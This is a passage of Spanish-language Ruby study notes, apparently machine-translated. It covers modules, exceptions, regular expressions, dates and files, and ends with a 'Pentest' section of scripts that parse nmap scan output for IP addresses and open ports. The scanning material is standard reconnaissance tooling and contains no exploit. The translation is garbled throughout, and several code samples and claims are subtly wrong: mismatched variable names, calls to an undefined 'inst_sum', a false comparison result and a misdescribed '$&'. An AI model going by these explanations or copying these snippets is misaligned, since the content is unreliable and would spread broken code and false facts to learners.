#### Instance and Class Variables

* La herencia no afecta a las variables de instancia
* Las variables de clase se comparten y son visibles a partir de métodos de instancia, métodos de clase y por la definición de clase misma.

#### Constants

* Son heredados y pueden ser anunciados
* cuando intenta anular una constante heredada, Ruby crea una nueva con el mismo nombre pero disponible sólo para la subclase.

#### Private methods

* Métodos privados se pueden utilizar dentro de las clases heredadas
* Los métodos privados se heredan

#### Protected methods

* Son heredados y pueden ser utilizados similares a los métodos privados
* La diferencia es que tienes que usarlos de una manera explícita (notación de object.method) cuando se usa dentro (y no fuera) de una clase o subclase.

### Modules

* http://ruby-doc.org/core-1.9.3/Module.html
* se utiliza para definir espacios de nombres y mixins.
* Un módulo es esencialmente una colección de métodos, constantes y variables de clase con un nombre.
* La principal diferencia entre clases y módulos: Los módulos no pueden ser instanteados No pueden ser subclasados, por lo tanto no hay una jerarquía de módulos

#### Namespace

* Es una manera de recopilar y atar métodos y constantes relacionados, dándoles un nombre que les ayude a usarlos.
* http://ruby-doc.org/core-2.1.0/Math.html
* Las matemáticas son el ejemplo más adecuado de los módulos utilizados como espacio de nombres
* Es una colección de constantes matemáticas (PI y E) y métodos, especialmente para funciones trigonométricas y trascendentales básicas.
* Módulos y espacios de nombres permiten u definir bibliotecas personalizadas: colección de constantes, clases, otros módulos, etc.

#### Mixin

* Mixin significa que si un módulo define los métodos de instancia (en lugar de los métodos de clase), esos métodos de instancia pueden mezclarse en otra clase; la implementación de la clase y el módulo se unen.
* Para mezclar un módulo en una clase, utilice la palabra clave **include**

Ejemplo:

```ruby
module B
  def hello; "Hello"; end
end

class A
  include B
  def world; "World"; end
end

obg = A.new

print obj,hello, " ", obj.world
# Output: Hello World =>nil
```

* Dos módulos de Ruby útiles diseñados para mixin son **Comparables** y **Enumerable**\*\*
* si su clase define al operador, u puede incluir Comparable para obtener el funcionamiento libre como:

```ruby
'<','<=','==','>','>=' and between?
```

* Si Enumerable se mezcla con tu clase, da u **sort**, **find**, **min**, **max**, etc... sin necesidad de implementarlos
* La plataforma Ruby también ofrece otras clases utilizables. Cada uno requiere que su clase de destino implemente algunos métodos para trabajar correctamente.

#### Namespace and Mixin Together

* Nada impide el uso de un módulo tanto como espacio de nombres como mezcla; simplemente proporciona métodos de instancia y clase al módulo

Matemáticas Por ejemplo: una vez que incluimos Matemáticas, no necesitamos especificar **Mas::** para acceder a sus constantes, métodos y así saber

```ruby
Math::PI
# Output: 3,14
Math::E
# Output: 2.71
Math::sqrt(25)
# Output: 5.0

include Math
Object
PI
# Output: 3,14
E
# Output: 2.71
sqrt(25)
# Output: 5.0
```

### Exceptions

* http://ruby-doc.org/core-1.9.3/Exception.html
* Deberíamos proporcionar algún código para ejecutar cuando estos errores ocurren con el fin de recuperar un flujo de ejecución correcto.
* por lo general se utilizan subclases de excepción para añadir información sobre el tipo de excepción levantada o para distinguir diferentes excepciones.

#### Raise

* Las excepciones son objetos, pero por lo general se crean con el método **leo** (en lugar de nuevo).
* **Raise** por sí solo crea un RuntimeError

**RuntimeError**

```ruby
raise "A runtime error"
```

#### Other Errors

With raise, you can specify the Error type too:

```ruby
→ raise ArgumentError, "Invalid argument"

def int_sum(a,b)
  raise(ArgumentError,"a isn't Int") if !a.is_a?Integer
  raise(ArgumentError,"b isn't Int") if !b.is_a?Integer
  a + b
end

inst_sum "a",10
# Output: "a isn't Int"
```

#### Custom Error

* ArgumentError, RuntimeError, ZeroDivisionError son subclases de StandardError
* Deja usar **NoIntError**
* Primero definimos la nueva clase NoIntError que se hereda de StandardError.

Es nuestra clase de error personalizado:

```ruby
class NoIntError < StandardError; end;

def int_sum(a,b)
  raise(NoIntError,"a isn't Int") if !a.is_a?Integer
  raise(NoIntError,"b isn't Int") if !b.is_a?Integer
  a + b
end

inst_sum "a",10
# Output: "a isn't Int"
```

#### Rescue

→ http://ruby-doc.org/core-1.9.3/Exception.html

* Si u quiere manejar una excepción y ejecutar algún código arbitrario cuando sucede, se puede utilizar **rescue**
* el rescate se define como una cláusula que puede adjuntarse a otras declaraciones (el comienzo\*\* es el más común)

#### Simple Rescue

* **$!** se refiere al último objeto de excepción
* si llama al método de hecho con un número entero inferior a 0, su ejecución infinita veces porque las declaraciones de devolución son siempre falsas. Por lo tanto, en algún momento, el script gasta toda su memoria.
* En algún momento, Ruby plantea una excepción porque la pila está llena. Rescate capta el objeto de excepción y la variable global $- lo almacena.

```ruby
def fact(n)
  return 1 if n==0
  return 1 if n==1
  n * fact(n-1)
end
begin
  a=fact(ARGV[0].to_i)
  p a
rescue
  p $!.message
end
```

#### Exception Objects

* **$!** se refiere al objeto de la última excepción. u puede utilizar una variable personal con rescure.
* En el ejemplo, usamos **exc** en su lugar of **$!**

```ruby
def fact(n)
  return 1 if n==0
  return 1 if n==1
  n * fact(n-1)
end
begin
  a=fact(ARGV[0].to_i)
  p a
rescue => exc
  p exc.message
end
```

#### Type based exception handling

* U puede manejar excepciones por su tipo:

```ruby

def int_sum(a,b)
  raise TypeError if !(a.is_a?Integer)
  raise TypeError if !(b.is_a?Integer)
  a + b
end

begin
  print "2 + 3 = ".int_sum(2,3),"\n"
  print int_sum(2) if ARGV[0] == "argument"
  print int_sum("a",10) if ARGV[0] == "type"
rescue ArgumentError => ae
  print "ArgumentError rescue: "
  print ae.message, "\n"
rescue TypeError => te
  print "TypeError rescue: "
  print te.message,"\n"
end

```

> El rescate puede seguir cualquier declaración. Si se produce una excepción, se ejecuta el cuerpo de rescate.

#### Other Clause

```ruby
- retry
- else
- ensure
```

#### Retry

* su cláusula que se puede utilizar dentro de una cláusula de rescate para volver a ejecutar el bloque de código que ha causado la excepción.
* Imagínense que u quiere actualizar un db y se produce una excepción (un error de red, un error de DB, etc). U puede intentarlo de nuevo (la red puede estar disponible más tarde).
* con **remeter** u puede hacer eso
* ejemplo: ZeroDIvisionError

```ruby
a = ARGV[0].to_i
b = ARGV[1].to_i

begin
  print "#{a} / #{b} = "
  print a / b,"\n"
rescue
  print "Error\n"
  b=1
  retry
end
```

* Tenga cuidado al usar **retry**, porque puede causar un bucle infinito

#### Else

* Se utiliza para ejecutar algún código arbitrario cuando el rescate no tiene ninguna excepción
* **else** puede ser puesto después de una cláusula **rescue**.

```ruby
begin
  # code
rescue
  # code
else
  # code
end
```

#### Ensure

* su utilizado para especificar algún código que siempre se ejecuta al final del flujo de inicio.
* El código se ejecuta siempre incluso si se produce una excepción dentro del flujo de control principal.
* **ensure** se puede insertar después de todas las cláusulas **rescue** y **else**.

```ruby
begin
  # normal flow
rescue
  # exception handling
else
  # no exception occur
ensure
  # always executed
end
```

#### Methods, Classes and Modules

* U puede utilizar todos los conceptos y cláusulas anteriores con métodos, clases y módulos, así sin necesidad de **btilación de inicio** de palabra clave

Ejemplo:

```ruby
def my_method(a,b,c)
  # normal flow
rescue 
  # exception handling
else
  # no exception occur
ensure
  # always executed
end
```

#### Ruby is much more

Hay muchas otras declaraciones, técnicas y características:

```ruby
→ Proc and Lamba abstraction
→ Closures
→ Functional programming and higher order function
→ Reflection
→ Metaprogamming
```

## Pentest

```
Regular Expressions

Dates and Time

Files and Directories

File Stream

Working with Nmap Files


```

### Regular Expressions

* Es un conjunto de caracteres que describe un patrón de búsqueda
* por lo general un pentester utiliza expresiones regulares para filtrar y extraer información en documentos, comunicaciones cliente-servidor, salida de herramientas y mucho más.
* Por ejemplo, podemos utilizarlos para extraer todas las direcciones de correo electrónico de una página web, así como los resultados de la imagen.
* De un pov defensivo, las expresiones regulares también se utilizan comúnmente para verificar y desinfectar las entradas. Esto se puede utilizar para evitar que la entrada tenga mal carácter o texto inválido.

#### Basic Concepts

* Una expresión regular (regex o regexp) es delimitada por recorta delante en todos los idiomas: /regex body/
* ejemplo:
* El operador de empareja de patrón básico de Ruby. Devuelve cero si la cuerda no contiene el patrón; de lo contrario devuelve el índice donde comienza el primer partido

```ruby
"Hello World" =~/World/
# Output: 6
"Hello World" =~/Torld/
# Output: nil
```

#### Regexp Object

* el regex son los casos de la clase regex; por lo tanto, son objetos de regex

u puede crear un objeto regex con:

```ruby
literal notation ( **/pattern/** )
**%r** notation
OO notation
```

Los delimitadores son personalizados:

```ruby
/hello/ = literal notation
%r{hello} = {} delimiters
%r!hello! = ! delimiter
```

OO notación sólo use **new** o **compile** como sinónimo Para regex.new:

```ruby
Regexp.new("hello")
Regexp.compile("hello")
```

#### Regexp Modifier

* u puede añadir banderas para especificar información adicional sobre la correspondencia que tiene que ser realizada
* **i** se utiliza Para la coincidencia insensible de caso. cuando se añade después del último **/** devuelve el índice de la coincidencia

```ruby
"Hello World" =~/hello/i
# Output: 0
"Hello World" =~/world/i
# Output: 6
```

* con notación OO, u tienes que especificar el atributo

```ruby
reg = Regexp.new("hello",Regexp::IGNORECASE)
"Hello World" =~reg
# Output: 0
	
reg = Regexp.new("world",Regexp::IGNORECASE)
"Hello World" =~reg
# Output: 6
```

→ moreover = http://www.ruby-doc.org/core-1.9.3/Regexp.html

#### Match method

* si u tiene un objeto regexp y u invocar la coincidencia en una cadena, le da a u otro objeto que describe la coincidencia (un objeto MatchData)
* con un objeto matchData, u puede obtener información sobre la coincidencia, como la posición de la subcadenación empareja, las palabras emparejadas y mucho más.
* u puede tratar MatchData como una matriz - donde en cada posición u puede encontrar la subcadeing a juego.

//no matching

```ruby
matching = /world/.match("Hello World") # because its case sensitive
# Output: nil
matching = /world/i.match("Hello World") # with **i** flag, we disable the case sensitive and have a match
# Output: <MatchData "World">
matching[0]
# Output: "World"
matching[1]
# Output: nil
matching.begin(0)
# Output: 6
```

#### Special Characters

Characters w/ un significado especial:

```ruby
() [] {} . ? + | ^ $
```

* Para usarlos, tienes que usar un backslash \*_\*_ para escapar de ellos.

```ruby
"Hello World)" =~/\(/ 
# Output: 12
"Where are you from?" =~/\?/
# Output: 18
```

#### Regular Expression Syntax

\| Rule | Matching | | . | A single character (it does not match newline) | | \[] | At least one of the character in square brackets | | \[^] | At least one of the character not in square brackets | | \d | A digit. Same as \[0-9] (0-9 means from 0 to 9) | | \D | A non digit characters. Same as \[^0-9] | | \s | A white space | | \S | A non whitespace | | \w | A word character, same as \[A-Za-z0-9] | | \W | A non word character |

Example:

```ruby
"Hello World" =~/auh/ # does not contain auh
# Output: nil 
"Hello World" =~/[auh]/ # does not contain 'a' 'u' or 'h'
# Output: nil
"Hello World" =~/[auh]/i # contain 'H' at index 0
# Output: 0
"Hello World" =~/[0-9]/
# Output: nil
"Hello World" =~/[\d]/
# Output: nil
"I'm 50" =~/[\s]/ # whitespace at index 3
# Output: 3
"Hello World!" =~/[\W]/ # '!' at index 10 - its a non word
# Output: 10
```

#### Sequences

* Es una concatenación de la expresión regular. La cadena debe coincidir con el patrón concatenado resultante.

\| Rule | Matching | | xy | Regular expression **x** followed by regular expression **y** |

Ejemplo:

```ruby
"abc 123 abc " =~/\d\d\d\s/ # 3 digit followed by a whitespace - matched at index 4
# Output: 4
```

#### Alternatives

```ruby
(  |  pipe character ) are used to specify that the string must match at least one of the two or more regular expressions.
```

\| Rule | Matching | | x|y | Either regular expression **x** or regular expression **y** |

Ejemplo:

```ruby
"Hello World" =~/\s|\./ # a whitespace or a point
# Output: 5
"Hello.World" =~/\s|\./ # a whitespace or a point
# Output: 5
```

#### Groups

* Los caracteres especiales **(** y **)** se utilizan para agrupar una expresión regular en una unidad sintáctica única

\| Rule | Matching | | (exp) | exp is grouped as a single unit |

Example:

```ruby
"I'm Ruby" =~/Rub(y|ber)/
# Output: 4
"I'm Rubber" =~/Rub(y|ber)/
# Output: 4
"I'm Ruber" =~/Rub(y|ber)/ # cause there is not ruber, only rubber
# Output: nil
```

* Los grupos se utilizan a menudo para capturar más de un patrón dentro de una cadena
* Con los objetos de MatchData, podemos obtener una descripción de estos patrones: palabras coincidentes, posiciones y mucho más.

Ejemplo:

```ruby
reg = /(Ruby).(Perl)/
matching = reg.match("I like Ruby&Perl")

matching[0] # the entire matching
# Output: "Ruby&Perl" 
matching[1] # ruby word matching
# Output: "Ruby"
matching[2] # perl word matching
# Output: "Perl"
matching.begin(0) # the entire matching index
# Output: 7
matching.begin(1) # ruby word matching index
# Output: 7
matching.begin(2) # perl word matching index
# Output: 12
```

→ moreover = http://www.ruby-doc.org/core-1.9.3/MatchData.html

#### Repetitions

\| Rule | Matching | | exp\* | Zero or more occurrences of exp | | exp+ | One or more occurrences of exp | | exp? | Zero or one occurrence of exp | | exp{n} | n occurrences of exp (N is a natural number) | | exp{n,} | n or more occurrences of exp | | exp{n,m} | at least n and at most m occurrences of exp |

Example:

```ruby
"RubyRubyRuby" =~/(Ruby){3}
# Output: 0
"RubyRubyRuby" =~/(Ruby){4}
# Output: nil
```

#### Anchors

* Se utilizan para especificar la posición de la coincidencia de patrones.

\| Rule | Matching | | ^exp | exp must be at the begin of a line | | exp$ | exp must be at the end of a line | | \Aexp | exp must be at the begin of the whole string | | exp\Z | exp must be at the end of the whole string | | exp\z | same as \Z but match newline too |

Examples:

```ruby
"Hello World" =~/^Hello/
# Output: 0
"Hello World" =~/\AHello/
# Output: 0
```

#### A real world example

* Supongamos que tengamos una cadena que contiene una dirección IP y queremos identificar su posición, así como extraer sus partes separadas por puntos (oto de la dirección).

```ruby

/(\d{1,3}).(\d{1,3}).(\d{1,3}).(\d{1,3})/

ip_reg = /(\d{1,3}).(\d{1,3}).(\d{1,3}).(\d{1,3})/
my_ip = ip_reg.match("Some text... 192.168.1.1 other text ... ")
my_ip.to_a
# Output: ['192.168.1.1','192','168','1','1']

```

* el último ejemplo no identifica sólo IP, y si la cadena contiene 999.999.999.999.999?
* Hay muchas expresiones regulares estándar y verificadas que u puede utilizar de acuerdo a sus necesidades en Internet.

### Regular expressoins in the Ruby platform

* Global variables
* Working with string

#### Global Variables

\| Variable | Description | | $\~ | The MatchData object of the last match | | $& | The substring that matches the first group pattern | | $1 | The substring that matches the second group pattern | $2, $3, etc | And so on |

Ejemplo:

```ruby

"Hello World !!!" =~/^(hello)\s(world)\s(!!!)$/i
# Output: 0
$~
# Output: #matchdata "Hello World !!!"

$&
# Output: "Hello World !!!"
$1
# Output: "Hello"
$2
# Output: World
$3
# Output: "!!!"
$~.to_a
# Output: ["Hello World !!!", "Hello", "World", "!!!"]

```

* Tlo más importante is **$\~** porque todos los demás se derivan de él..

#### Working with strings

* u puede utilizar regexp Para todos los métodos vistos en la sección Básica: **sub, gsub, split** y más.
* método **escan**
* permite e iterarar a través de más ocurreciones del texto que coincide en el patrón

Example:

```ruby
text = "abcas 192.168.1.2 textomtxo 192.168.4.20 more text"
pattern = /(?:\d{1,3}\.){3}(?:\d){1,3}/
text.scan(pattern) { |x| puts x }
  192.168.1.2
  192.168.4.20
```

> (?:exp) = esta sintaxis evitar capturar la subexpresión dentro ( ) por lo que sólo se captura toda la expresión externa (la dirección IP)

### Dates and Time

* Time class
* Other classes

#### Time class

* Provee métodos para trabajar con la fecha y la función hora del sistema operativo. → http://www.ruby-doc.org/core-1.9.3/Time.html

#### Create a time instance

Hora actual del sistema:

```ruby
TIme.new
```

Hora actual convertida en utc:

```ruby
Time.new.utc
```

Tiempo.local es sinónimo de Time.new:

```ruby
Time.local(2014,5,6)
# Output: 2014-05-06 00:00:00 + 0200
```

#### Components of a time

```ruby
t = TIme.local(2014,1,13,11,50)
# Output: 2014-01-13 11:50:00 +0100
t.year
# Output: 2014
t.month
# Output: 1
t.day
# Output: 13
t.hour
# Output: 11
t.yday
# Output: 13
```

#### Predicates and conversions

```ruby
t = Time.now
# Output: 2014-01-13 11:36:30 +0100

t.tuesday?
# Output: false
t.monday?
# Output: true
t.utc?
# Output: false
```

La conversión entre zona también puede ser útil:

```ruby
t = Time.new.utc
# Output: 2014-01-13 10:42:47 UTC
t.zone
# Output: "UTC"
t.localtime
# Output: 2014-01-13 11:42:47 +0100
t.zone
# Output: "CET"

// timestamp
t.to_i
# Output: 1389610659

// an array
t.to_a
# Output: [39, 57, 11, 13, 1, 2014, 1, 13, false, "CET"]

```

#### Arithmetic

Operaciones simples con el tiempo (y -) con el fin de añadir segundos a su objeto de tiempo:

```ruby
t = Time.now
# Output: 2014-01-13 12:21:40 +0100

t + 20 //add 20 seconds to t
t + 60*60 //add an hour to t
t + 6*(60*60*24) // add 6 days to t

```

> gem install -r active\_support

// esta gema añade algunos métodos útiles cuando u trabajo w aritmética

```ruby
require 'active_support/core_ext/numeric/time'
 true

10.days
# Output: 864000
t = TIme.now
	...
t + 10.days # add 10 days
t + 1.week # add 1 week

```

Si no quieres instalar una gema, u puedes escribir tu propia versión.

```ruby
class Numeric
  def days; self*60*60*24;end
end

t = TIme.now # grab current time
t + 10.days # add 10 days
```

#### Comparisons

```ruby
now = Time.now
before = now -50
after = now +50

now > before
# Output: true
after > before
# Output: false
before+50==now
# Output: true
```

#### From time to string

u can obtain a string with to\_s or **ctime** method:

```ruby
t.to_s
t.getutc.to_s
t.ctime
t.getutc.ctime
```

* **strftime** formatos de método Objetos Tiempo de acuerdo a las directivas de la cadena de formato dada.

Las directivas comienzan con el % de carácter:

```ruby
%Y = year
%m = month
%d = day
etc
```

Ejemplo:

```ruby
t.strftime("%Y/%m/%d")
  "2014/01/14"
t.strftime("%H:%M:%S")
  "10:33:22"
```

Hay directivas combinadas:

```ruby
%c = date and time
%D = date
%F = ISO 8601
%r = 12hour time
%R = 24hour time
%T = 24 hour time with seconds
```

→ moreover = http://www.ruby-doc.org/core-1.9.3/Time.html

#### Other Classes

* Date = su utilización para gestionar la fecha
* DateTime = su subclase de Datos y permite gestionar el tiempo también.

> Ambos se pueden usar como Tiempo. Pero es más lento

### Files and Directories

* Dir : For directories
* File : For files

#### Dir

* dir clase define métodos de clase que permiten trabajar con directorios. Proporga una variedad de maneras de enumerar directorios, así como su contenido. También se puede utilizar para saber dónde se ejecuta el script Ruby o para navegar entre directorios de sistema de archivos.

#### Current Directory

* **pwd** y **getwd** métodos de clase se pueden utilizar para identificar el directorio de trabajo actual.

```ruby
Dir.pwd
# Output: "/root/ruby"
Dir.getwd
# Output: "/root/ruby"
```

* The **home** método en su lugar devuelve el directorio de inicio del usuario actual (o el directorio de inicio del usuario dado)

```ruby
Dir.home
# Output: "/root"
Dir.home("root")
# Output: "/root"
Dir.home("mark")
# Output: "/home/mark"
```

* The **chdir** método se puede utilizar para cambiar el directorio actual

```ruby
Dir.pwd
# Output: "/root/ruby"
Dir.chdir("dir_example")
Dir.pwd
# Output: "/root/ruby/dir_example"
```

* with chdir también puede usar **..** (de vuelta a directorio padre)
* puede usar con bloques de código (bucles)

```ruby
puts Dir.pwd
Dir.chdir("nested_dir") do
  puts Dir.pwd
end
puts Dir.pwd
```

Output:

```ruby
/root/ruby/dir_example
/root/ruby/dir_example	/nested_dir
/root/ruby/dir_example
```

#### Creation / Deletion

* **mkdir** método para crear directorios

```ruby
Dir.mkdir("teste")
```

* **delete, rmdir,unlink** eliminar un directorio existente

```ruby
Dir.unlink "test"
```

## Directory Listings

* **entries** devuelve una matriz que contiene todos los archivos en el directorio dado

```ruby
Dir.pwd
# Output: '/root/'
Dir.entries(".") # le dot means the current folder
# Output: ['chdir.rb', '.', '..', 'chdir-rb~', 'nested_dir', 'test']
```

* con un iterador que podemos usar **foreach**

```ruby
Dir.foreach(".") do |file|
  puts file
end
```

* **glob** método o **\[]** permite buscar archivos y directorios en el sistema de archivos, de acuerdo con un patrón específico.

→ moreover = http://en.wikipedia.org/wiki/Glob\_(programming)

Ejemplo para listar todos los archivos rb en el directorio:

```ruby
Dir["*.rb"]
Dir.glob("*.rb")
```

→ moreover glob references - http://ruby-doc.org/core-1.9.3/Dir.html

#### Testing Directories

* **Exist?** and **exists?** se puede utilizar para probar si la ruta especificada es un directorio

```ruby
Dir.exist? "/path"
Dir.exists? "/path"
```

#### Dir Objects

```ruby
dir = Dir.new("dir_example")
dir.each {|x| puts x}
//it will list all files
```

#### Windows Application Directory Listing Example

* comprobar si una aplicación está instalada en una máquina de Windows y si la suya, intenta enumerar el contenido del directorio.

Por lo general, las aplicaciones Windows se instalan en los siguientes directorios:

```ruby

→ C:\Program Files
→ C:\Program Files (x86)
→ C:\

directories = [
'C:\\Program Files\\',
'C:\\Program Files (x86)\\',
'C:\\'
]

installed = false
\for dir in directories do
dir = dir + ARGV[0]
if Dir.exist? dir then
  installed = true;
  puts %Q!"#{dir}" exists!
  puts "\nListing: "
  Dir.foreach(dir) { |x| puts x }
end
end

if !installed then
  puts ARGV[0] + " is not installed"
end

```

### Files

* Esta clase permite a los programadores trabajar con archivos: abrir un archivo, obtener información sobre él, cambiar su nombre, cambiar su permiso y mucho más. → http://ruby-doc.org/core-1.9.3/File.html

Comae si existe un archivo:

```ruby
File.exist? "empty_file.txt"
# Output: true
```

Obsta el tamaño del archivo en bytes:

```ruby
File.size "teste.txt"
# Output: 2976
```

Devuelve el tamaño en bytes o nulo si el archivo está vacío:

```ruby
 File.size? "test.txt"
 # Output: nil
```

Devuelve la verdad si el archivo está vacío:

```ruby
File.zero?
# Output: true
```

Comaque si el argumento es un archivo, directorio o un enlace simbólico:

```ruby
File.file? "test.txt"
# Output: true
File.directory? "nested_dir"
# Output: true
File.symlink? "test_link"
# Output: true
```

puede comprobar el tipo directamente con **ftype**:

```ruby
File.ftype "test.txt"
 # Output: "file"
```

Métodos **readable?**, **writable?** y **ejecutable?** se puede utilizar para probar los permisos:

```ruby
File.readable? "test.txt"
# Output: true
File.writable? "test.txt"
# Output: true
File.executable? "test.txt"
# Output: false
```

**mtime** and **atime** devuelve respectivamente el último tiempo de modificación y la última hora de acceso como objeto Tiempo:

```ruby
at=File.atime "test.txt"
# Output: "2014-01-17 11:09:24 +0100"
at.getutc
mt = File.mtime "test.txt"
mt.getutc
```

**ctime** se puede utilizar en Windows para recuperar el tiempo de creación:

```ruby
File.ctime "test.txt"
```

**stat** method devuelve un Archivo::Ejeto de Estado que encapsula información de estado común sobre el archivo:

```ruby
st = File.stat "test.txt"
st.size
# Output: "3185"
st.atime
# Output: "2014-01-17 11:32:14 +0100"
```

#### Working with Names

**basename** El método se puede utilizar para extraer el nombre del archivo de forma una ruta. Si especifica el argumento del sufijo, entonces el sufijo en sí se elimina del resultado:

```ruby
File.basename path
# Output: "test.txt"
File.basename(path, ".txt")
# Output: "test"
```

**dirname** El método se puede utilizar para extraer sólo la parte del directorio de una cadena de ruta. Esto cortará la última parte de la cuerda (por lo tanto no tiene el sufijo arg):

```ruby
File.dirname path
 # Output: "~/ruby/file_example"
```

**extname** método devuelve la extensión del archivo de la ruta dada mientras dividido devuelve un array que contiene tanto dirname como nombre base:

```ruby
File.extname path
 # Output: ".txt"
File.split path
# Output: ["~/ruby/file_example", "test.txt"]
```

**join** El método nos permite crear rutas de cuerda. Con FILE::SEPARATOR u puede crear caminos relativos y absolutos:

```ruby
File.join("~","ruby","file_example")
File.join("","root","ruby","file_example")
```

**expand\_path** método convierte una ruta relativa a un camino absoluto. Tiene dos argumentos, el segundo es opcional y si se proporciona, está preapendizado como directorio al primer argumento.

* Si el primer agumento contiene un \*\*\*\*, entonces se utiliza el directorio de inicio de uso actual; de lo contrario, el directorio de trabajo actual se utiliza como el directorio prepended.

```ruby
File.expand_path("nested_dir")
# Output: "/root/ruby/file_example"
File.expand_path("~/Desktop")
# Output: "/root/Desktop"
File.expand_path("Documents","/root")
# Output: "/root/Documents"
```

**fnmatch** método prueba si una cadena de nombre de archivo coincide con un patrón especificado. El patrón no es una expresión regular, sino su habitual sintaxis de glob (primer argumento):

```ruby
File.fnmatch("*.txt","test.txt")
# Output: true
File.fnmatch("*.rb","test.txt")
# Output: false
File.fnmatch("*.rb","example.rb")
# Output: true
File.fnmatch("/*/*.rb","/root/ex.rb")
# Output: true
```

#### Creation / Deletion / Renaming

**open** método con el modificador de escritura **w** para crear un archivo:

```ruby
File.open("a_file.txt","w")
```

> también puede utilizar **new** para crear

**rename** permite cambiar el nombre de un archivo o un directorio:

```ruby
File.rename("a_file.txt","new_file.txt")
```

**delete** y **unlink** se utilizan para eliminar un archivo:

```ruby
File.delete "new_file.txt"
```

**chmod** para cambiar los permisos de un archivo:

```ruby
File.chmod(0666, "test.txt")
```

// el **chown** se utiliza para cambiar el propietario y el grupo de un archivo

* Además, archivos: http://ruby-doc.org/core-1.9.3/File.html

### File Stream

#### Reading From a file

→ http://ruby-doc.org/core-1.9.3/IO.html

→ http://ruby-doc.org/core-1.9.3/File.html

If **open** es seguido por un bloque, el objeto de archivo se pasa al bloque y la secuencia se cierra automáticamente en la terminación del bloque:

```ruby
File.open("multi_line.txt","r") do |file|
  contents = file.read
  puts contents
end
```

Output:

```ruby
first line
second line
third line
```

**read** se puede utilizar sin abrir el archivo:

```ruby
content = FIle.read("multi_line.txt")
```

// la misma salida

El método **readline** es similar a la lectura, pero se puede utilizar para obtener un array que contiene la línea del archivo:

```ruby
File.readlines("multi_line.txt")
```

**each** también se puede utilizar para leer una línea de archivo por línea:

```ruby
file = File.new("text.txt","r")
count =0
file.each do |line|
  puts "n:#{count} #{line}"
  count+=1
end
```

> Hay otros métodos para leer sólo caracteres (**readchar**) y bytes (**readbyte**):

#### Writing to a file

```ruby

- w = write only
- w+ = read and write
- a = append 
- a+ = append and read

File.open("text.txt","w") do |file|
  file.puts "First line \n"
  # or
  File.write "Second line"
end

```

### Working with NMAP files

#### IP Extraction

```ruby
nmap -PE -sn -n 

-PE = ICMP echo request
-sn = only PING Scan (disable port scan)
-n = Never do DNS resolution
```

NMAP Tipos de productos:

```ruby
-oN = normal output
-oX = xml format
-oG = greapable format
-oA = create 3 files with all the previous formats
```

Podemos agarrar la IP con expresión regular:

```ruby
/^(?:Nmap scan report For )((?:\d{1,3}\.){3}\d{1,3})/
```

* (?:Nmap scan report For ) = identifica si la línea comienza con **nmap scan report For**

```ruby
 ((?:\d{1,3}\.){3}\d{1,3}) = matches an IP address
```

* (?: ) Sintaxis evita capturar la subexpresión entre paréntesis internas. Son grupos y se utilizan para capturar más de un patrón dentro de una cuerda.
* Por lo tanto, si usamos (?: ), cuando comparamos todo el patrón con una cadena, no captura la subexpresión dentro de él.

#### example 1 : Grab IP from NMAP normal format

```ruby
begin
  File.open(ARGV[0], "r") do |file|
    file.each do |line|
      /^(?:Nmap scan report For )((?:\d{1,3}\.){3}\d{1,3})/ =~ line
      puts $1 if $1
    end
  end
rescue StandardError => e
  puts "An error occurred: #{e}"
end


```

#### example 2 : Grab IP from NMAP Grepable format

```ruby
begin
  File.open(ARGV[0], "r") do |file|
    file.each do |line|
      /^(?:Host:)\s((?:\d{1,3}\.){3}\d{1,3})/ =~ line
      puts $1 if $1
    end
  end
rescue StandardError => e
  puts "An error occurred: #{e}"
end

```

* NMAP XML file
* no es una buena idea de utilizar regexp, es mejor para analizar los datos
* queremos extraer el atributo **addr** del nodo de la dirección

→ https://www.w3schools.com/xml/xquery\_intro.asp

→ https://www.w3schools.com/xml/xpath\_intro.asp

* // si quieres aprender más sobre estructuras xml
* Ruby proporciona diferentes bibliotecas y gemas para manejar XML. Uno de ellos es el módulo REXML.

→ http://www.germane-software.com/software/rexml/

→ http://ruby-doc.org/stdlib-1.9.3/libdoc/rexml/rdoc/REXML.html

Tenemos que llegar al nodo de dirección de cada nodo de huésco. En xpath, podemos lograrlo usando diferentes estrategias:

```ruby
/nmaprun/host/address[@addrtype='ipv4']
# means that we start from the root node (vertex), then go down in the host node and finally we go down in the address node which contains the addrtype attribute equals to ipv4

//host/address[@addrtype='ipv4']
# means that there is not a starting point, rather all of the times we find a host node, we have to go down in an address node and check the addrtype.

```

* Dado que usaremos **REXML**, una de las sintaxis anteriores debe insertarse en uno el método proporcionado por REXML Para extracción de datos.

#### example 3 - Grab the NMAP XML output:

```ruby
require "rexml/document"
begin
  doc = REXML::Document.new File.new(ARGV[0])
  doc.elements.each("//host/address[@addrtype='ipv4']") do |addr|
    puts addr.attributes["addr"]
  end
rescue Exception => e
  puts e
end
```

#### All Together

* Agregue el shebang, cuenta qué intérprete ejecuta el código de scripts.

```ruby
which ruby = /usr/bin/ruby
set executions permitions with chmod +x <file.rb>
```

```ruby

#!/usr/bin/ruby
# this method contains the main script logic
def main(opt,file)
  case opt
    when nil then usage
    when "-oN" then normal file
	when "-oG" then grepable file
	when "-oX" then xml file
	else detect opt
  end
end

```

* si queremos ejecutar el script de cualquier directorio, tenemos que añadir el directorio del script a la variable de entorno PATH del usuario root
* tenemos que cambiar la variable **PATH** en el archivo .bashrc contenido en el usuario raíz dir

Añadir la línea:

```ruby
export PATH=/<path of the script>:$PATH
```

* los métodos normales - gruñables - xml, contienen el mismo código de los scripts de formato específicos que hicimos anteriormente.
* vamos a ver el método **detect**

Si no se proporciona ninguna opción, el script detecta si se proporciona un archivo de salida nmap estándar:

```ruby

.nmap | .xml | .gnmap

def detect(file)
  extensions = [".nmap",".xml",".gnmap"]
  opt = ["-oN","-oX","-oG"]
  i = extensions.index(File.extname file)
  # if the file has a valid standard extension we retry
  # the main method with the correct option
  (main(opt[i].file);return) if i
  #otherwise an exception occurs
  raise Exception.new("Supported extensions: "+extensions.join(" | "))
end

```

### Open Ports Extraction

Veremos cómo extraer direcciones IP y puertos del comando:

```ruby
nmap -sS -n
# -sS = TCP SYN request
# -n = never do DNS resolution
```

Los argumentos que debe manejar el script son los siguientes:

```ruby
pextr-n.rb ip [-closed | -filtered | -open] file
```

```ruby

#!/usr/bin/ruby

begin
  # escape all the dots ( . ) -> ip is used in 
  # ip_pattern regular expression
  ip = ARGV[0].gsub(".","\\.")
  
  # check if the optional argment 'state' is provided
  options=["-open","-closed","-filtered"]
  # [1..-1] deletes the first minus character from ARGV[1]
  port_state=ARGV[1][1..-1] if options.include? ARGV[1]
  # if port_state is nil - > default state is 'open'
  port_state = "open" if !port_state
  # check if argument is the file
